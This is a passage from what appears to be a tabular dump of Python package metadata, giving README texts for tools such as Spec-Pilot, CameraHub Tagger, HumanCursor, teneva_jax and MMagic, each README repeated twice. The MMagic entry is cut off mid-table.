We encourage users to provide feedback and contribute to the development of Spec-Pilot to make it more robust and feature-rich.

## License

Spec-Pilot is released under the [GNU General Public License v3.0](https://www.gnu.org/licenses/gpl-3.0.en.html).
","# Spec-Pilot

Spec-Pilot is a command-line tool and Python package that helps generate, modify, and validate OpenAPI specifications using natural language processing (NLP). It simplifies the creation and management of OpenAPI projects, making it more accessible to developers and non-developers alike.

## Features

- Initialize new OpenAPI projects
- Generate OpenAPI specifications
- Modify OpenAPI specifications using natural language
- Validate OpenAPI specifications
- Create OpenAPI assets from templates

## Installation

You can install Spec-Pilot using pip:

```bash
pip install spec_pilot
```

After installing Spec-Pilot, you also need to download the spaCy language model:

```bash
python -m spacy download en_core_web_sm
```

## CLI Usage

To use Spec-Pilot as a command-line tool, run the following commands:

- Initialize a new OpenAPI project:

```bash
spec_pilot --init project_name
```

- Generate the OpenAPI specification for a specific project:

```bash
spec_pilot --generate project_name
```

- Modify an existing OpenAPI specification using natural language:

```bash
spec_pilot --nlp ""Add a new endpoint called 'get_users' with a GET method""
```

- Validate an OpenAPI specification file:

```bash
spec_pilot --validate spec_file
```

- Create a new OpenAPI asset from a template:

```bash
spec_pilot --create template asset_name output_path
```
## Generate and save your OpenAPI components using the corresponding functions

## Python Package Usage

You can also use Spec-Pilot as a Python package in your projects. Here's an example of how to use it:

```python
from spec_pilot import init_project, generate_openapi_spec, process_natural_language_input, vacuum, render_template

# Initialize a new OpenAPI project
init_project(""project_name"")

# Generate the OpenAPI specification for a specific project
generate_openapi_spec(""project_name"")

# Modify an existing OpenAPI specification using natural language
modified_openapi_spec = process_natural_language_input(""Add a new endpoint called 'get_users' with a GET method"", openapi_spec)

# Validate an OpenAPI specification file
vacuum([""validate"", ""spec_file""])

# Create a new OpenAPI asset from a template
render_template(""template"", ""asset_name"", ""output_path"")
```

## Limitations of NLP Functionality

Spec-Pilot's NLP functionality is currently limited and may not understand all possible natural language inputs. It can handle basic operations such as adding, updating, and removing endpoints, methods, and parameters. However, it might not handle complex operations or understand all possible variations of natural language expressions.

## Roadmap

To improve the NLP functionality and make Spec-Pilot more complete, we plan to:

1. Expand the range of natural language expressions that can be understood by the tool.
2. Add support for more complex operations, such as modifying response schemas and security settings.
3. Enhance error handling and provide better feedback to users when their input cannot be understood or processed.
4. Integrate with more advanced NLP libraries or services to improve the overall performance and accuracy of the tool.

We encourage users to provide feedback and contribute to the development of Spec-Pilot to make it more robust and feature-rich.

## License

Spec-Pilot is released under the [GNU General Public License v3.0](https://www.gnu.org/licenses/gpl-3.0.en.html).
",jmfwolf/spec-pilot
camerahub-tagger,https://github.com/camerahub/tagger,5,2839,2839,"# CameraHub Tagger

CameraHub Tagger is a companion command-line app for [CameraHub](https://camerahub.info/) to tag JPG
scans of negatives with EXIF metadata from the CameraHub API. This means you can organise your film
scans in a digital photo management app with full metadata.

To use CameraHub Tagger, you must already have entered your cameras, lenses, films and negatives into CameraHub. When you scan your negatives, name them consistently like `{FILM}-{FRAME}-IMG0001.jpg` (for example `45-12-IMG0001.jpg` is frame 12 on film 45).

Run CameraHub Tagger in the same directory. CameraHub Tagger will attempt to match the JPGs with the
negatives by using the filename (it will ask you if it can't figure it out). It will then generate a
unique ID for that scanned JPG to tie it conclusively to the negative. Once the link is made, CameraHub
Tagger will retrieve all data about that negative, film, lens and camera and use it to generate EXIF
metadata, the same as digital cameras do. It is safe to run CameraHub Tagger multiple times on the same
files, as only changed tags are written.

When your images have been tagged, any digital photo app will read and display these tags in the same
way as digital photos.

## Installation

Install from [PyPI](https://pypi.org/project/camerahub-tagger/) with Pip:

```console
pip install camerahub-tagger
```

This installs a `tagger` binary in your `$PATH`.

## Usage

```console
tagger [-h] [-r] [-a] [-y] [-d] [-f FILE] [-p PROFILE]
```

### `-h --help`

Display help message and exit

### `-r --recursive`

Search for scans recursively from current directory

### `-a --auto`

Don't prompt user to identify scans, only guess based on filename

### `-y --yes`

Accept all changes without confirmation

### `-d --dry-run`

Don't write any tags to image files

### `-f --file FILE`

Image file to be tagged. If not supplied, tag everything in the current directory.

### `-p --profile PROFILE`

CameraHub connection profile. Default: `prod`.

## Config

CameraHub Tagger needs some basic connection details to connect to CameraHub.
On first run, it will ask for credentials for CameraHub and save them for future use.

If you need multiple profiles (e.g. if you have multiple users, or you need to connect to
a development instance of CameraHub) you can configure the extra profiles manually by editing
`~/camerahub.ini` and adding more blocks.

The names of each profile are arbitrary, but CameraHub Tagger will automatically use the `prod` profile
unless you override it with the `--profile` option. Here's an example:

```ini
[prod]
server = https://camerahub.info/api
username = anseladams
password = yosemite

[dev]
server = https://dev.camerahub.info/api
username = annieleibovitz
password = johnandyoko

[local]
server = http://127.0.0.1:8000/api
username = admin
password = admin
```","# CameraHub Tagger

CameraHub Tagger is a companion command-line app for [CameraHub](https://camerahub.info/) to tag JPG
scans of negatives with EXIF metadata from the CameraHub API. This means you can organise your film
scans in a digital photo management app with full metadata.

To use CameraHub Tagger, you must already have entered your cameras, lenses, films and negatives into CameraHub. When you scan your negatives, name them consistently like `{FILM}-{FRAME}-IMG0001.jpg` (for example `45-12-IMG0001.jpg` is frame 12 on film 45).

Run CameraHub Tagger in the same directory. CameraHub Tagger will attempt to match the JPGs with the
negatives by using the filename (it will ask you if it can't figure it out). It will then generate a
unique ID for that scanned JPG to tie it conclusively to the negative. Once the link is made, CameraHub
Tagger will retrieve all data about that negative, film, lens and camera and use it to generate EXIF
metadata, the same as digital cameras do. It is safe to run CameraHub Tagger multiple times on the same
files, as only changed tags are written.

When your images have been tagged, any digital photo app will read and display these tags in the same
way as digital photos.

## Installation

Install from [PyPI](https://pypi.org/project/camerahub-tagger/) with Pip:

```console
pip install camerahub-tagger
```

This installs a `tagger` binary in your `$PATH`.

## Usage

```console
tagger [-h] [-r] [-a] [-y] [-d] [-f FILE] [-p PROFILE]
```

### `-h --help`

Display help message and exit

### `-r --recursive`

Search for scans recursively from current directory

### `-a --auto`

Don't prompt user to identify scans, only guess based on filename

### `-y --yes`

Accept all changes without confirmation

### `-d --dry-run`

Don't write any tags to image files

### `-f --file FILE`

Image file to be tagged. If not supplied, tag everything in the current directory.

### `-p --profile PROFILE`

CameraHub connection profile. Default: `prod`.

## Config

CameraHub Tagger needs some basic connection details to connect to CameraHub.
On first run, it will ask for credentials for CameraHub and save them for future use.

If you need multiple profiles (e.g. if you have multiple users, or you need to connect to
a development instance of CameraHub) you can configure the extra profiles manually by editing
`~/camerahub.ini` and adding more blocks.

The names of each profile are arbitrary, but CameraHub Tagger will automatically use the `prod` profile
unless you override it with the `--profile` option. Here's an example:

```ini
[prod]
server = https://camerahub.info/api
username = anseladams
password = yosemite

[dev]
server = https://dev.camerahub.info/api
username = annieleibovitz
password = johnandyoko

[local]
server = http://127.0.0.1:8000/api
username = admin
password = admin
```",camerahub/tagger
humancursor,https://github.com/riflosnake/HumanCursor,2,4559,4559,"# HumanCursor: A Python package for simulating human mouse movements

HumanCursor is a Python package that allows you to simulate realistic human mouse movements on the web and the system. It can be used for automating scripts that require mouse interactions, such as web scraping, testing, or gaming.

## Features

- HumanCursor uses a natural motion algorithm that mimics the way humans move the mouse cursor, with variable speed, acceleration, and curvature.
- HumanCursor can perform various mouse actions, such as clicking, dragging, scrolling, and hovering.
- HumanCursor can work with any web browser or system application that supports mouse input.

## Installation

To install, you can use pip:

    pip install HumanCursor

## Usage

### WebCursor

To use HumanCursor for Web, you need to import the `WebCursor` class, and create an instance:

```python
from HumanCursor.cursors import WebCursor

cursor = WebCursor(driver)
```

Then, you can use the following methods to simulate mouse movements and actions:

- `cursor.move_to()`: Moves the mouse cursor to the element or location on the webpage.
- `cursor.click_on()`: Clicks on the element or location on the webpage.
- `cursor.drag_and_drop()`: Drags the mouse cursor from one element and drops it to another element on the screen.
- `cursor.move_by_offset()`: Moves the cursor by x and y pixels.
- `cursor.control_scroll_bar()`: Sets the scroll bar to a certain level, can be a volume, playback slider or anything. Level is set by float number from 0 to 1, meaning fullness
- `cursor.scroll_into_view_of_element()`: Scrolls into view of element if not already there, it is called automatically from above functions.

These functions can accept as destination, either the WebElement itself, or a list of 'x' and 'y' coordinates.

Some parameters explained:

- `relative_position`: Takes a list of x and y percentages as floats from 0 to 1, which indicate the exact position inside an element
                                       for example, if you set it to [0.5, 0.5], it will move the cursor to the center of the element.
- `absolute_offset`: If you input a list of coordinates instead of webelement, if you turn this to True, the coordinates will be interpreted as absolute movement by pixels, and not like coordinates in the webpage.

### SystemCursor

To use HumanCursor for your system mouse, you need to import the `SystemCursor` class, and create an instance just like we did above:

```python
from HumanCursor.cursors import SystemCursor

cursor = SystemCursor()
```

The `SystemCursor` class, which should be used for controlling the system mouse (with pyautogui), only inherits the `move_to()` and `click_on()` functions, accepting only the list of 'x' and 'y' coordinates as input, as there are no elements available.


Some examples:

```python
cursor.move_to(element)  # moves to element 
cursor.move_to(element, relative_position=[0.5, 0.5])  # moves to the center of the element
cursor.move_to([450, 600])  # moves to coordinates relative to viewport x: 450, y: 600
cursor.move_to([450, 600], absolute_offset=True)  # moves 450 pixels to the right and 600 pixels down

cursor.move_by_offset(200, 170)  # moves 200 pixels to the right and 170 pixels down
cursor.move_by_offset(-10, -20)  # moves 10 pixels to the left and 20 pixels up

cursor.click_on([170, 390])  # clicks on coordinates relative to viewport x: 170, y: 390
cursor.click_on(element, relative_position=[0.2, 0.5])  # clicks on 0.2 x width, 0.5 x height position of the element.

cursor.drag_and_drop(element1, element2)  # clicks and hold on first element, and moves to and releases on the second
cursor.drag_and_drop(element, [640, 320], drag_from_relative_position=[0.9, 0.9])  # drags from element on 0.9 x width, 0.9 x  height (far bottom right corner) and moves to and releases to coordinates relative to viewport x: 640, y: 320

cursor.control_scroll_bar(element, amount_by_percentage=0.75)  # sets a slider to 75% full
cursor.controll_scroll_bar(element, amount_by_percentage=0.2, orientation='vertical')  # sets a vertical slider to 20% full

cursor.scroll_into_view_of_element(element)  # scrolls into view of element if not already in it
cursor.show_cursor()  # injects javascript that will display a red dot over the cursor on webpage. Should be called only for visual testing before script and not actual work.

```


## License

HumanCursor is licensed under the MIT License. See LICENSE for more information.
","# HumanCursor: A Python package for simulating human mouse movements

HumanCursor is a Python package that allows you to simulate realistic human mouse movements on the web and the system. It can be used for automating scripts that require mouse interactions, such as web scraping, testing, or gaming.

## Features

- HumanCursor uses a natural motion algorithm that mimics the way humans move the mouse cursor, with variable speed, acceleration, and curvature.
- HumanCursor can perform various mouse actions, such as clicking, dragging, scrolling, and hovering.
- HumanCursor can work with any web browser or system application that supports mouse input.

## Installation

To install, you can use pip:

    pip install HumanCursor

## Usage

### WebCursor

To use HumanCursor for Web, you need to import the `WebCursor` class, and create an instance:

```python
from HumanCursor.cursors import WebCursor

cursor = WebCursor(driver)
```

Then, you can use the following methods to simulate mouse movements and actions:

- `cursor.move_to()`: Moves the mouse cursor to the element or location on the webpage.
- `cursor.click_on()`: Clicks on the element or location on the webpage.
- `cursor.drag_and_drop()`: Drags the mouse cursor from one element and drops it to another element on the screen.
- `cursor.move_by_offset()`: Moves the cursor by x and y pixels.
- `cursor.control_scroll_bar()`: Sets the scroll bar to a certain level, can be a volume, playback slider or anything. Level is set by float number from 0 to 1, meaning fullness
- `cursor.scroll_into_view_of_element()`: Scrolls into view of element if not already there, it is called automatically from above functions.

These functions can accept as destination, either the WebElement itself, or a list of 'x' and 'y' coordinates.

Some parameters explained:

- `relative_position`: Takes a list of x and y percentages as floats from 0 to 1, which indicate the exact position inside an element
                                       for example, if you set it to [0.5, 0.5], it will move the cursor to the center of the element.
- `absolute_offset`: If you input a list of coordinates instead of webelement, if you turn this to True, the coordinates will be interpreted as absolute movement by pixels, and not like coordinates in the webpage.

### SystemCursor

To use HumanCursor for your system mouse, you need to import the `SystemCursor` class, and create an instance just like we did above:

```python
from HumanCursor.cursors import SystemCursor

cursor = SystemCursor()
```

The `SystemCursor` class, which should be used for controlling the system mouse (with pyautogui), only inherits the `move_to()` and `click_on()` functions, accepting only the list of 'x' and 'y' coordinates as input, as there are no elements available.


Some examples:

```python
cursor.move_to(element)  # moves to element 
cursor.move_to(element, relative_position=[0.5, 0.5])  # moves to the center of the element
cursor.move_to([450, 600])  # moves to coordinates relative to viewport x: 450, y: 600
cursor.move_to([450, 600], absolute_offset=True)  # moves 450 pixels to the right and 600 pixels down

cursor.move_by_offset(200, 170)  # moves 200 pixels to the right and 170 pixels down
cursor.move_by_offset(-10, -20)  # moves 10 pixels to the left and 20 pixels up

cursor.click_on([170, 390])  # clicks on coordinates relative to viewport x: 170, y: 390
cursor.click_on(element, relative_position=[0.2, 0.5])  # clicks on 0.2 x width, 0.5 x height position of the element.

cursor.drag_and_drop(element1, element2)  # clicks and hold on first element, and moves to and releases on the second
cursor.drag_and_drop(element, [640, 320], drag_from_relative_position=[0.9, 0.9])  # drags from element on 0.9 x width, 0.9 x  height (far bottom right corner) and moves to and releases to coordinates relative to viewport x: 640, y: 320

cursor.control_scroll_bar(element, amount_by_percentage=0.75)  # sets a slider to 75% full
cursor.controll_scroll_bar(element, amount_by_percentage=0.2, orientation='vertical')  # sets a vertical slider to 20% full

cursor.scroll_into_view_of_element(element)  # scrolls into view of element if not already in it
cursor.show_cursor()  # injects javascript that will display a red dot over the cursor on webpage. Should be called only for visual testing before script and not actual work.

```


## License

HumanCursor is licensed under the MIT License. See LICENSE for more information.
",riflosnake/humancursor
battlemaster,https://github.com/johnnystarr/battlemaster,0,15,15,"# battlemaster
","# battlemaster
",johnnystarr/battlemaster
neuralbasics,https://github.com/HCook86/NeuralBasics,5,0,0,,,hcook86/neuralbasics
teneva-jax,https://github.com/AndreiChertkov/teneva_jax,1,2963,2963,"# teneva_jax


## Description

This python package, named **teneva_jax** (**ten**sor **eva**luation with **jax**), provides a very compact implementation of basic operations in the low rank tensor-train (TT) format with jax framework for approximation, optimization and sampling with multidimensional arrays and multivariate functions. The program code is organized within a functional paradigm and it is very easy to learn and use. Each function has detailed documentation and various usage demos.

> Please, see also our github repository [teneva](https://github.com/AndreiChertkov/teneva), which contains the basic (""numpy"") version of the code.


## Installation

> Current version ""0.1.1"".

The package can be installed via pip: `pip install teneva` (it requires the [Python](https://www.python.org) programming language of the version >= 3.8). It can be also downloaded from the repository [teneva_jax](https://github.com/AndreiChertkov/teneva_jax) and installed by `python setup.py install` command from the root folder of the project.

> Required python package [""jax[cpu]""](https://github.com/google/jax) (0.4.6+) will be automatically installed during the installation of the main software product. However, it is recommended that you manually install it first.


## Documentation, examples and tests

- See detailed [online documentation](https://teneva-jax.readthedocs.io) for a description of each function and various numerical examples for each function.
- See the jupyter notebooks in the `demo` folder with brief description and demonstration of the capabilities of each function from the `teneva_jax` package. Note that all examples from this folder are also presented in the online documentation.


## Authors

- [Andrei Chertkov](https://github.com/AndreiChertkov)
- [Gleb Ryzhakov](https://github.com/G-Ryzhakov)
- [Ivan Oseledets](https://github.com/oseledets)

> ✭__🚂  The stars that you give to **teneva_jax**, motivate us to develop faster and add new interesting features to the code 😃


## Citation

If you find our approach and/or code useful in your research, please consider citing:

```bibtex
@article{chertkov2023black,
    author    = {Chertkov, Andrei and Ryzhakov, Gleb and Oseledets, Ivan},
    year      = {2023},
    title     = {Black box approximation in the tensor train format initialized by ANOVA decomposition},
    journal   = {arXiv preprint arXiv:2208.03380 (accepted into the SIAM Journal on Scientific Computing)},
    doi       = {10.48550/ARXIV.2208.03380},
    url       = {https://arxiv.org/abs/2208.03380}
}
```

```bibtex
@article{chertkov2022optimization,
    author    = {Chertkov, Andrei and Ryzhakov, Gleb and Novikov, Georgii and Oseledets, Ivan},
    year      = {2022},
    title     = {Optimization of functions given in the tensor train format},
    journal   = {arXiv preprint arXiv:2209.14808},
    doi       = {10.48550/ARXIV.2209.14808},
    url       = {https://arxiv.org/abs/2209.14808}
}
```
","# teneva_jax


## Description

This python package, named **teneva_jax** (**ten**sor **eva**luation with **jax**), provides a very compact implementation of basic operations in the low rank tensor-train (TT) format with jax framework for approximation, optimization and sampling with multidimensional arrays and multivariate functions. The program code is organized within a functional paradigm and it is very easy to learn and use. Each function has detailed documentation and various usage demos.

> Please, see also our github repository [teneva](https://github.com/AndreiChertkov/teneva), which contains the basic (""numpy"") version of the code.


## Installation

> Current version ""0.1.1"".

The package can be installed via pip: `pip install teneva` (it requires the [Python](https://www.python.org) programming language of the version >= 3.8). It can be also downloaded from the repository [teneva_jax](https://github.com/AndreiChertkov/teneva_jax) and installed by `python setup.py install` command from the root folder of the project.

> Required python package [""jax[cpu]""](https://github.com/google/jax) (0.4.6+) will be automatically installed during the installation of the main software product. However, it is recommended that you manually install it first.


## Documentation, examples and tests

- See detailed [online documentation](https://teneva-jax.readthedocs.io) for a description of each function and various numerical examples for each function.
- See the jupyter notebooks in the `demo` folder with brief description and demonstration of the capabilities of each function from the `teneva_jax` package. Note that all examples from this folder are also presented in the online documentation.


## Authors

- [Andrei Chertkov](https://github.com/AndreiChertkov)
- [Gleb Ryzhakov](https://github.com/G-Ryzhakov)
- [Ivan Oseledets](https://github.com/oseledets)

> ✭__🚂  The stars that you give to **teneva_jax**, motivate us to develop faster and add new interesting features to the code 😃


## Citation

If you find our approach and/or code useful in your research, please consider citing:

```bibtex
@article{chertkov2023black,
    author    = {Chertkov, Andrei and Ryzhakov, Gleb and Oseledets, Ivan},
    year      = {2023},
    title     = {Black box approximation in the tensor train format initialized by ANOVA decomposition},
    journal   = {arXiv preprint arXiv:2208.03380 (accepted into the SIAM Journal on Scientific Computing)},
    doi       = {10.48550/ARXIV.2208.03380},
    url       = {https://arxiv.org/abs/2208.03380}
}
```

```bibtex
@article{chertkov2022optimization,
    author    = {Chertkov, Andrei and Ryzhakov, Gleb and Novikov, Georgii and Oseledets, Ivan},
    year      = {2022},
    title     = {Optimization of functions given in the tensor train format},
    journal   = {arXiv preprint arXiv:2209.14808},
    doi       = {10.48550/ARXIV.2209.14808},
    url       = {https://arxiv.org/abs/2209.14808}
}
```
",andreichertkov/teneva_jax
mmagic,https://github.com/open-mmlab/mmagic,50,21334,14274,"<div id=""top"" align=""center"">
  <img src=""docs/en/_static/image/mmagic-logo.png"" width=""500px""/>
  <div>&nbsp;</div>
  <div align=""center"">
    <font size=""10""><b>M</b>ultimodal <b>A</b>dvanced, <b>G</b>enerative, and <b>I</b>ntelligent <b>C</b>reation (MMagic [em'mædʒɪk])</font>
  </div>
  <div>&nbsp;</div>
  <div align=""center"">
    <b><font size=""5"">OpenMMLab website</font></b>
    <sup>
      <a href=""https://openmmlab.com"">
        <i><font size=""4"">HOT</font></i>
      </a>
    </sup>
    &nbsp;&nbsp;&nbsp;&nbsp;
    <b><font size=""5"">OpenMMLab platform</font></b>
    <sup>
      <a href=""https://platform.openmmlab.com"">
        <i><font size=""4"">TRY IT OUT</font></i>
      </a>
    </sup>
  </div>
  <div>&nbsp;</div>

[![PyPI](https://badge.fury.io/py/mmagic.svg)](https://pypi.org/project/mmagic/)
[![docs](https://img.shields.io/badge/docs-latest-blue)](https://mmagic.readthedocs.io/en/latest/)
[![badge](https://github.com/open-mmlab/mmagic/workflows/build/badge.svg)](https://github.com/open-mmlab/mmagic/actions)
[![codecov](https://codecov.io/gh/open-mmlab/mmagic/branch/master/graph/badge.svg)](https://codecov.io/gh/open-mmlab/mmagic)
[![license](https://img.shields.io/github/license/open-mmlab/mmagic.svg)](https://github.com/open-mmlab/mmagic/blob/main/LICENSE)
[![open issues](https://isitmaintained.com/badge/open/open-mmlab/mmagic.svg)](https://github.com/open-mmlab/mmagic/issues)
[![issue resolution](https://isitmaintained.com/badge/resolution/open-mmlab/mmagic.svg)](https://github.com/open-mmlab/mmagic/issues)

[📘Documentation](https://mmagic.readthedocs.io/en/latest/) |
[🛠️Installation](https://mmagic.readthedocs.io/en/latest/get_started/install.html) |
[📊Model Zoo](https://mmagic.readthedocs.io/en/latest/model_zoo/overview.html) |
[🆕Update News](https://mmagic.readthedocs.io/en/latest/changelog.html) |
[🚀Ongoing Projects](https://github.com/open-mmlab/mmagic/projects) |
[🤔Reporting Issues](https://github.com/open-mmlab/mmagic/issues)

English | [简体中文](README_zh-CN.md)

</div>

<div align=""center"">
  <a href=""https://openmmlab.medium.com/"" style=""text-decoration:none;"">
    <img src=""https://user-images.githubusercontent.com/25839884/218352562-cdded397-b0f3-4ca1-b8dd-a60df8dca75b.png"" width=""3%"" alt="""" /></a>
  <img src=""https://user-images.githubusercontent.com/25839884/218346358-56cc8e2f-a2b8-487f-9088-32480cceabcf.png"" width=""3%"" alt="""" />
  <a href=""https://discord.gg/raweFPmdzG"" style=""text-decoration:none;"">
    <img src=""https://user-images.githubusercontent.com/25839884/218347213-c080267f-cbb6-443e-8532-8e1ed9a58ea9.png"" width=""3%"" alt="""" /></a>
  <img src=""https://user-images.githubusercontent.com/25839884/218346358-56cc8e2f-a2b8-487f-9088-32480cceabcf.png"" width=""3%"" alt="""" />
  <a href=""https://twitter.com/OpenMMLab"" style=""text-decoration:none;"">
    <img src=""https://user-images.githubusercontent.com/25839884/218346637-d30c8a0f-3eba-4699-8131-512fb06d46db.png"" width=""3%"" alt="""" /></a>
  <img src=""https://user-images.githubusercontent.com/25839884/218346358-56cc8e2f-a2b8-487f-9088-32480cceabcf.png"" width=""3%"" alt="""" />
  <a href=""https://www.youtube.com/openmmlab"" style=""text-decoration:none;"">
    <img src=""https://user-images.githubusercontent.com/25839884/218346691-ceb2116a-465a-40af-8424-9f30d2348ca9.png"" width=""3%"" alt="""" /></a>
</div>

## 🚀 What's New <a><img width=""35"" height=""20"" src=""https://user-images.githubusercontent.com/12782558/212848161-5e783dd6-11e8-4fe0-bbba-39ffb77730be.png""></a>

### New release [**MMagic v1.0.0**](https://github.com/open-mmlab/mmagic/releases/tag/v1.0.0) \[25/04/2023\]:

We are excited to announce the release of MMagic v1.0.0 that inherits from [MMEditing](https://github.com/open-mmlab/mmediting) and [MMGeneration](https://github.com/open-mmlab/mmgeneration).

After iterative updates with OpenMMLab 2.0 framework and merged with MMGeneration, MMEditing has become a powerful tool that supports low-level algorithms based on both GAN and CNN. Today, MMEditing embraces Generative AI and transforms into a more advanced and comprehensive AIGC toolkit: **MMagic** (**M**ultimodal **A**dvanced, **G**enerative, and **I**ntelligent **C**reation). MMagic will provide more agile and flexible experimental support for researchers and AIGC enthusiasts, and help you on your AIGC exploration journey.

We highlight the following new features.

**1. New Models**

We support 11 new models in 4 new tasks.

- Text2Image / Diffusion
  - ControlNet
  - DreamBooth
  - Stable Diffusion
  - Disco Diffusion
  - GLIDE
  - Guided Diffusion
- 3D-aware Generation
  - EG3D
- Image Restoration
  - NAFNet
  - Restormer
  - SwinIR
- Image Colorization
  - InstColorization

**2. Magic Diffusion Model**

For the Diffusion Model, we provide the following ""magic"" :

- Support image generation based on Stable Diffusion and Disco Diffusion.
- Support Finetune methods such as Dreambooth and DreamBooth LoRA.
- Support controllability in text-to-image generation using ControlNet.
- Support acceleration and optimization strategies based on xFormers to improve training and inference efficiency.
- Support video generation based on MultiFrame Render.
- Support calling basic models and sampling strategies through DiffuserWrapper.

**3. Upgraded Framework**

By using MMEngine and MMCV of OpenMMLab 2.0 framework, MMagic has upgraded in the following new features:

- Refactor DataSample to support the combination and splitting of batch dimensions.
- Refactor DataPreprocessor and unify the data format for various tasks during training and inference.
- Refactor MultiValLoop and MultiTestLoop, supporting the evaluation of both generation-type metrics (e.g. FID) and reconstruction-type metrics (e.g. SSIM), and supporting the evaluation of multiple datasets at once.
- Support visualization on local files or using tensorboard and wandb.
- Support for 33+ algorithms accelerated by Pytorch 2.0.

**MMagic** has supported all the tasks, models, metrics, and losses in [MMEditing](https://github.com/open-mmlab/mmediting) and [MMGeneration](https://github.com/open-mmlab/mmgeneration) and unifies interfaces of all components based on [MMEngine](https://github.com/open-mmlab/mmengine) 😍.

Please refer to [changelog.md](docs/en/changelog.md) for details and release history.

Please refer to [migration documents](docs/en/migration/overview.md) to migrate from [old version](https://github.com/open-mmlab/mmagic/tree/0.x) MMEditing 0.x to new version MMagic 1.x .

## 📄 Table of Contents

- [📖 Introduction](#-introduction)
- [🙌 Contributing](#-contributing)
- [🛠️ Installation](#%EF%B8%8F-installation)
- [📊 Model Zoo](#-model-zoo)
- [🤝 Acknowledgement](#-acknowledgement)
- [🖊️ Citation](#%EF%B8%8F-citation)
- [🎫 License](#-license)
- [🏗️ ️OpenMMLab Family](#%EF%B8%8F-️openmmlab-family)

<p align=""right""><a href=""#top"">🔝Back to top</a></p>

## 📖 Introduction

MMagic (**M**ultimodal **A**dvanced, **G**enerative, and **I**ntelligent **C**reation) is an advanced and comprehensive AIGC toolkit that inherits from [MMEditing](https://github.com/open-mmlab/mmediting) and [MMGeneration](https://github.com/open-mmlab/mmgeneration). It is an open-source image and video editing&generating toolbox based on PyTorch. It is a part of the [OpenMMLab](https://openmmlab.com/) project.

Currently, MMagic support multiple image and video generation/editing tasks.

https://user-images.githubusercontent.com/49083766/233564593-7d3d48ed-e843-4432-b610-35e3d257765c.mp4

The best practice on our main branch works with **Python 3.8+** and **PyTorch 1.9+**.

### ✨ Major features

- **State of the Art Models**

  MMagic provides state-of-the-art generative models to process, edit and synthesize images and videos.

- **Powerful and Popular Applications**

  MMagic supports popular and contemporary image restoration, text-to-image, 3D-aware generation, inpainting, matting, super-resolution and generation applications. Specifically, MMagic supports fine-tuning for stable diffusion and many exciting diffusion's application such as ControlNet Animation with SAM. MMagic also supports GAN interpolation, GAN projection, GAN manipulations and many other popular GAN’s applications. It’s time to begin your AIGC exploration journey!

- **Efficient Framework**

  By using MMEngine and MMCV of OpenMMLab 2.0 framework, MMagic decompose the editing framework into different modules and one can easily construct a customized editor framework by combining different modules. We can define the training process just like playing with Legos and provide rich components and strategies. In MMagic, you can complete controls on the training process with different levels of APIs. With the support of [MMSeparateDistributedDataParallel](https://github.com/open-mmlab/mmengine/blob/main/mmengine/model/wrappers/seperate_distributed.py), distributed training for dynamic architectures can be easily implemented.

<p align=""right""><a href=""#top"">🔝Back to top</a></p>

## 🙌 Contributing

More and more community contributors are joining us to make our repo better. Some recent projects are contributed by the community including:

- [GLIDE](projects/glide/configs/README.md) is contributed by @Taited.
- [Restormer](configs/restormer/README.md) is contributed by @AlexZou14.
- [SwinIR](configs/swinir/README.md) is contributed by @Zdafeng.

[Projects](projects/README.md) is opened to make it easier for everyone to add projects to MMagic.

We appreciate all contributions to improve MMagic. Please refer to [CONTRIBUTING.md](https://github.com/open-mmlab/mmcv/blob/main/CONTRIBUTING.md) in MMCV and [CONTRIBUTING.md](https://github.com/open-mmlab/mmengine/blob/main/CONTRIBUTING.md) in MMEngine for more details about the contributing guideline.

<p align=""right""><a href=""#top"">🔝Back to top</a></p>

## 🛠️ Installation

MMagic depends on [PyTorch](https://pytorch.org/), [MMEngine](https://github.com/open-mmlab/mmengine) and [MMCV](https://github.com/open-mmlab/mmcv).
Below are quick steps for installation.

**Step 1.**
Install PyTorch following [official instructions](https://pytorch.org/get-started/locally/).

**Step 2.**
Install MMCV, MMEngine and MMagic with [MIM](https://github.com/open-mmlab/mim).

```shell
pip3 install openmim
mim install 'mmcv>=2.0.0'
mim install 'mmengine'
mim install 'mmagic'
```

**Step 3.**
Verify MMagic has been successfully installed.

```shell
cd ~
python -c ""import mmagic; print(mmagic.__version__)""
# Example output: 1.0.0
```

**Getting Started**

After installing MMagic successfully, now you are able to play with MMagic! To generate an image from text, you only need several lines of codes by MMagic!

```python
from mmagic.apis import MMagicInferencer
sd_inferencer = MMagicInferencer(model_name='stable_diffusion')
text_prompts = 'A panda is having dinner at KFC'
result_out_dir = 'output/sd_res.png'
sd_inferencer.infer(text=text_prompts, result_out_dir=result_out_dir)
```

Please see [quick run](docs/en/get_started/quick_run.md) and [inference](docs/en/user_guides/inference.md) for the basic usage of MMagic.

**Install MMagic from source**

You can also experiment on the latest developed version rather than the stable release by installing MMagic from source with the following commands:

```shell
git clone https://github.com/open-mmlab/mmagic.git
cd mmagic
pip3 install -e .
```

Please refer to [installation](docs/en/get_started/install.md) for more detailed instruction.

<p align=""right""><a href=""#top"">🔝Back to top</a></p>

## 📊 Model Zoo

<div align=""center"">
  <b>Supported algorithms</b>
</div>
<table align=""center"">
  <tbody>
    <tr align=""center"" valign=""bottom"">
      <td>
        <b>Conditional GANs</b>
      </td>
      <td>
        <b>Unconditional GANs</b>
      </td>
      <td>
        <b>Image Restoration</b>
      </td>
      <td>
        <b>Image Super-Resolution</b>
      </td>
    </tr>
    <tr valign=""top"">
      <td>
        <ul>
            <li><a href=""configs/sngan_proj/README.md"">SNGAN/Projection GAN (ICLR'2018)</a></li>
            <li><a href=""configs/sagan/README.md"">SAGAN (ICML'2019)</a></li>
            <li><a href=""configs/biggan/README.md"">BIGGAN/BIGGAN-DEEP (ICLR'2018)</a></li>
      </ul>
      </td>
      <td>
        <ul>
          <li><a href=""configs/dcgan/README.md"">DCGAN (ICLR'2016)</a></li>
          <li><a href=""configs/wgan-gp/README.md"">WGAN-GP (NeurIPS'2017)</a></li>
          <li><a href=""configs/lsgan/README.md"">LSGAN (ICCV'2017)</a></li>
          <li><a href=""configs/ggan/README.md"">GGAN (ArXiv'2017)</a></li>
          <li><a href=""configs/pggan/README.md"">PGGAN (ICLR'2018)</a></li>
          <li><a href=""configs/singan/README.md"">SinGAN (ICCV'2019)</a></li>
          <li><a href=""configs/styleganv1/README.md"">StyleGANV1 (CVPR'2019)</a></li>
          <li><a href=""configs/styleganv2/README.md"">StyleGANV2 (CVPR'2019)</a></li>
          <li><a href=""configs/styleganv3/README.md"">StyleGANV3 (NeurIPS'2021)</a></li>
        </ul>
      </td>
      <td>
        <ul>
          <li><a href=""configs/swinir/README.md"">SwinIR (ICCVW'2021)</a></li>
